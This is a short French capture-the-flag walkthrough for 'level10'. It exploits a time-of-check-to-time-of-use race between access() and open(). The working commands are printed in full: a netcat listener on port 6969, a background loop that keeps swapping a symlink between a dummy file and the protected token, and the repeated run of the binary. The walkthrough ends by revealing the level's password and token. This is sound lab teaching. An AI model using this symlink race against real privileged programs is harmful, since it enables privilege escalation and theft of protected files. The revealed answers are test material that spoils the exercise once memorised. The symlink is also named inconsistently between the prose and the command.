
## **Level 10:**


le binaire level10 doit envoyer le fichier token sur un host, si il a le droit sur celui ci.

Le programme utilise `access()` pour checker les droits sur le fichier.  Cette fonction est depreciee: il est possible, entre le moment ou `acces` check le droit sur le fichier, et le moment ou il est ouvert ensuite par `open`, de changer ce fichier, et ouvri un un fichier qu'on ne pourrais pas ouvrir normalement.

D’abord, ecouter le port 6969 avec `Netcat : nc -lk 6969`, dans un autre terminal. (avec `strings level10`, on peut voir quil se connecte a un host sur le port 6969).

Ensuite, dans `/tmp/`, creer un fichier bidon, sur lequel nous avons les droits. -> `touch /tmp/fake`

Faire une boucle infine en arriere plan qui cree un symlink `token`: une fois vers `/home/user/level10/token` (le vrai), et une fois vers le fichier bidon.

`while true; do ln -sf /tmp/fake evil; ln -sf /home/user/level10/token evil; done &`

Grace a notre boucle,  `access()` va checker les droits du fichier bidon et donner l’acces, entre temps, le symlink a changé et pointe vers le vrai fichier, qui s’ouvre nornalement.

Tant que la boucle est lancé, a force d’essayer de run `./level10 token 127.0.0.1`, le cas arrive et on a le pass !

> Password: woupa2yuojeeaaed06riuj63c

> Token : **feulo4b72j7edeahuete3no7c**